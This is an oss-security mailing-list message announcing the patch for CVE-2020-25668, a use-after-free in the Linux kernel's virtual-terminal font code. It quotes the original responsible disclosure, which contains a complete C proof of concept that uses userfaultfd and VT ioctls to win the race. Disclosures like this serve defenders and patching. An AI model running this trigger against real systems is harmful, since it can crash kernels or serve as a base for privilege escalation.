X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5459" "Wednesday" "4" "November" "2020" "14:47:49" "+0800" "Minh Yuan" "yuanmingbuaa@gmail.com" "<CAH5WSp4YD2pfY+ZEqOpZ48N5sxtcn+aC2+27bNp4EFZZLVUhnw@mail.gmail.com>" "176" "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil "11" "2020110406:47:49" "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" (number mark "U       yuanmingbuaa Nov  4  176/5459  " thread-indent "\"[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt\"\n") "<CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>" ("<CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>") nil nil nil nil nil nil nil "[oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5174 invoked by uid 550); 4 Nov 2020 11:10:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5457 invoked from network); 4 Nov 2020 06:48:37 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
         :cc;
        bh=tCVpaBaldGBR22M0hhIMxR3E8iSWshKcJXV+Wm21NDU=;
        b=CHm5I70yzNkMbHdJM136QGeUrjvDyvwl7SqS+JzmYvWbNFCpceZCTD8eugasA1b796
         bma/uOBeJYZCDFRbBIQVnTLkHHoxpK6EUbd3YfsfINgzzSZ/uYKaIXakgFM9V5IT4mDj
         PTD+debQx15TjIGXZyttJG74e3IUP6YnJ+khcUX7U8pWFxwuzFEHaJvdVxZkYj5BHEfh
         sIvN/7rQw3HBMK2GXkyhzoBEbhr8CRbvVc3NBZB5yITQbUlP5oUUQY0xGyEnY5zPcuf3
         r80eNIYoHFVIzEVj0ucaAPgbKnhJIjRKRtrQ+e0VmN/0sYYqMqz5flSwM9EW5I89xrUR
         poqw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to:cc;
        bh=tCVpaBaldGBR22M0hhIMxR3E8iSWshKcJXV+Wm21NDU=;
        b=a3ts9IPL+0becEYLx4XOc/ZHIXXvm5M+9hnPr0imotYCVocRZ27v7lXg8so5YMqByH
         BIlhUxI9ZdP50gumw1MuVDc+JST3sqifUWyImTHlmXXHHhC2J7YwpVyEumWUd+fYKKfj
         k32VpjjhP2q0gRTzacV4zw1H24JrSDwzfcrTB/vmzZfhXJQsYwVdARl8NJMPLicq7G2j
         XoZpqM5n65+dHIJ/KAWFKc1F6IgQOddqGGQg/hYwCnbY0hMApln0hqqnon3uPjFUs+Cg
         Mx4X80fdCZApbmd+GDT+l9vbCnA5XH8FNTpMgzeT3ydYzNXBvwvtvyl1ipT4H5AlaqGS
         GKEg==
X-Gm-Message-State: AOAM531wF83aYBX4ZtmjRtsXEPUe6LZh8tylBAuajIfQzQ99DJ5g0/oL
	5kFi8bWGbVfvRse/nN6GzkkmAM9hvnc735ciMYvVCVJZeEkxZw==
X-Google-Smtp-Source: ABdhPJxKql0tVRifBwkM+PSKy4Cuh267GwnM3TAgXTrqGd+KsCugnyO5qxwR1qqzReEoCymxQFXW3FU6j0gM7f491Q0=
X-Received: by 2002:a17:906:6702:: with SMTP id a2mr22988448ejp.309.1604472505850;
 Tue, 03 Nov 2020 22:48:25 -0800 (PST)
MIME-Version: 1.0
References: <CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>
In-Reply-To: <CAH5WSp7NWysxDNpqHeN4+_edC9A8NQfp4+P_PuPNaueQgZQ4tw@mail.gmail.com>
From: Minh Yuan <yuanmingbuaa@gmail.com>
Date: Wed, 4 Nov 2020 14:47:49 +0800
Message-ID: <CAH5WSp4YD2pfY+ZEqOpZ48N5sxtcn+aC2+27bNp4EFZZLVUhnw@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: nopitydays@gmail.com
Content-Type: multipart/alternative; boundary="000000000000c3621105b3425d6d"
Subject: [oss-security] Re: CVE-2020-25668: Linux kernel concurrency use-after-free in vt

--000000000000c3621105b3425d6d
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

Hi all,

the patch (commit 90bfdeef83f1d6c696039b6a917190dcbbad3220) for this issue
is available now.

https://github.com/torvalds/linux/commit/90bfdeef83f1d6c696039b6a917190dcbb=
ad3220

Regards,

Yuan Ming

Minh Yuan <yuanmingbuaa@gmail.com> =E4=BA=8E2020=E5=B9=B410=E6=9C=8830=E6=
=97=A5=E5=91=A8=E4=BA=94 =E4=B8=8B=E5=8D=882:29=E5=86=99=E9=81=93=EF=BC=9A

> Hi,
>
> We recently discovered a uaf read in *con_font_op* in the latest kernel
> (v5.9.2 for now). The root cause of this vulnerability is that there exis=
ts
> a race in the global variable "*fg_console*", and the commit ca4463bf
> <https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commi=
t/?id=3Dca4463bf8438b403596edd0ec961ca0d4fbe0220> can't
> handle this issue.
>
> Specifically, after obtaining "vc_cons[fg_console]" by call
> *do_fontx_ioctl*, we can use *ioctl$VT_ACTIVATE* to change "fg_console"
> and use *ioctl$VT_DISALLOCATE* to free the old "vc_cons[fg_console]"
> obtained in  *do_fontx_ioctl*. As a result, the access to vc in
> *con_font_op* will cause a uaf.
>
>
> To reproduce this concurrency bug stably, I use "userfaultfd" to handle
> the order of "free" and "use". This is my PoC (it needs the privilege to
> access tty to trigger this bug.) :
>
> // author by ziiiro@thu
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <sys/ioctl.h>
> #include <linux/kd.h>
> #include <linux/vt.h>
> #include <string.h>
> #include <sys/types.h>
> #include <sys/stat.h>
> #include <sys/mman.h>
> #include <pthread.h>
> #include <errno.h>
> #include <stdlib.h>
> #include <signal.h>
> #include <sys/syscall.h>
> #include <linux/userfaultfd.h>
> #include <poll.h>
> #include <linux/prctl.h>
> #include <stdint.h>
> #include <unistd.h>
>
> #define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
>                        } while (0)
> int fd;
> static int page_size;
>
> static void *fault_handler_thread(void *arg) {
>   unsigned long value;
>   static struct uffd_msg msg;
>   long uffd;
>   static char *page =3D NULL;
>   struct uffdio_copy uffdio_copy;
>   int len, i;
>   if (page =3D=3D NULL) {
>     page =3D mmap(NULL, page_size, PROT_READ | PROT_WRITE,
>                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
>     if (page =3D=3D MAP_FAILED) errExit("mmap (userfaultfd)");
>   }
>   uffd =3D (long)arg;
>
>   for(;;) {
>     struct pollfd pollfd;
>     pollfd.fd =3D uffd;
>     pollfd.events =3D POLLIN;
>     len =3D poll(&pollfd, 1, -1);
>
>
>     read(uffd, &msg, sizeof(msg));
>     printf("    flags =3D 0x%lx\n", msg.arg.pagefault.flags);
>     printf("    address =3D 0x%lx\n", msg.arg.pagefault.address);
>    // change fg_console to 13
>     ioctl(fd, VT_ACTIVATE, 13);
>     ioctl(fd, VT_DISALLOCATE, 0);
>     // return to kernel-land
>     uffdio_copy.src =3D (unsigned long)page;
>     uffdio_copy.dst =3D (unsigned long)msg.arg.pagefault.address &
> ~(page_size - 1);
>     uffdio_copy.len =3D page_size;
>     uffdio_copy.mode =3D 0;
>     uffdio_copy.copy =3D 0;
>     if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) =3D=3D -1)
>         errExit("ioctl: UFFDIO_COPY");
>
>   }
> }
>
> void setup_pagefault(void *addr, unsigned size) {
>   long uffd;
>   pthread_t th;
>   struct uffdio_api uffdio_api;
>   struct uffdio_register uffdio_register;
>   int s;
>   // new userfaulfd
>
>   uffd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
>   if (uffd =3D=3D -1) errExit("userfaultfd");
>   // enabled uffd object
>   uffdio_api.api =3D UFFD_API;
>   uffdio_api.features =3D 0;
>   if (ioctl(uffd, UFFDIO_API, &uffdio_api) =3D=3D -1) errExit("ioctl:
> UFFDIO_API");
>   // register memory address
>   uffdio_register.range.start =3D (unsigned long)addr;
>   uffdio_register.range.len   =3D size;
>   uffdio_register.mode        =3D UFFDIO_REGISTER_MODE_MISSING;
>   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) =3D=3D -1)
> errExit("ioctl: UFFDIO_REGITER");
>   // monitor page fault
>   s =3D pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
>   if (s !=3D 0) errExit("pthread_create");
> }
>
>
> int main(int argc, char *argv[])
> {
>     fd =3D open("/dev/tty1", O_RDWR);
>     struct consolefontdesc cfdarg;
>     page_size =3D sysconf(_SC_PAGE_SIZE);
>     void *addr =3D (void*)mmap((void*)0x233000,
>                         page_size * 2,
>                         PROT_READ | PROT_WRITE,
>                         MAP_FIXED | MAP_PRIVATE | MAP_ANON,
>                         -1, 0);
>     if ((unsigned long)addr !=3D 0x233000)
>         errExit("mmap (0x233000)");
>
>     setup_pagefault(addr, page_size);
>     cfdarg.charcount =3D 256;
>     cfdarg.charheight =3D 8;
>     cfdarg.chardata =3D addr;
>     // change fg_console to 10
>     ioctl(fd, VT_ACTIVATE, 10);
>     ioctl(fd, PIO_FONTX, &cfdarg);
>
>     return 0;
> }
>
> I change "fg_console" to *10* and *13* respectively, you can change it to
> any other appropriate number.
>
> In addition to "con_font_op", I think other functions that read or write
> vc_cons[fg_console]  will also have the same issue.
>
> Timeline:
> * 10.23.20 - Vulnerability reported to security@kernel.org and
> linux-distros@vs.openwall.org.
> * 10.27.20 - CVE-2020-25668 assigned.
> * 10.30.20 - Vulnerability opened.
>
> Regards,
>
> Yuan Ming, Bodong Zhao from Tsinghua University
>

--000000000000c3621105b3425d6d--
